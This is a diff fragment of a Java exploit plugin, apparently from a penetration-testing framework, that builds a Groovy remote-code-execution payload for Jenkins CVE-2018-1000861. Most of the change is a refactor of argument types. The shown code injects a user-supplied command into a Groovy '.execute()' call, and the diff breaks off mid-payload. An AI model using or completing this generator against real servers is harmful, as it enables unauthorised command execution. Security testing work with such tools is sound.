@@ -15,21 +15,21 @@ public class JenkinsGroovyPayloadsCVE_2018_1000861 implements IPayloadGenerator 
     @Override
     public IArgsUsageBinder getPayloadCustomArgs() {
         IArgsUsageBinder usageBinder = JenkinsRCE.pluginHelper.createArgsUsageBinder();
-        IArgs url = JenkinsRCE.pluginHelper.createArgs();
+        IArg url = JenkinsRCE.pluginHelper.createArg();
         url.setName("url");
-        url.setType(IArgs.ARG_TYPE_HTTP_URL);
+        url.setType(IArg.ARG_TYPE_HTTP_URL);
         url.setRequired(true);
         url.setDefaultValue("http://192.168.1.1/jenkins");
         url.setDescription("目标URL");
 
-        IArgs command = JenkinsRCE.pluginHelper.createArgs();
+        IArg command = JenkinsRCE.pluginHelper.createArg();
         command.setName("command");
         command.setType(0);
         command.setRequired(true);
         command.setDefaultValue("whoami");
         command.setDescription("要执行的命令");
 
-        List<IArgs> args = new ArrayList<>();
+        List<IArg> args = new ArrayList<>();
         args.add(url);
         args.add(command);
         usageBinder.setArgsList(args);
@@ -37,9 +37,9 @@ public class JenkinsGroovyPayloadsCVE_2018_1000861 implements IPayloadGenerator 
     }
 
     @Override
-    public void generatorPayload(Map<String, String> customArgs, IResultOutput resultOutput) {
-        String command = customArgs.get("command");
-        String url = customArgs.get("url");
+    public void generatorPayload(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
+        String command = (String) customArgs.get("command");
+        String url = (String) customArgs.get("url");
         final String payload = "public class x {" +
                 "public x(){" +
                 "\""+command+"\".execute()" +
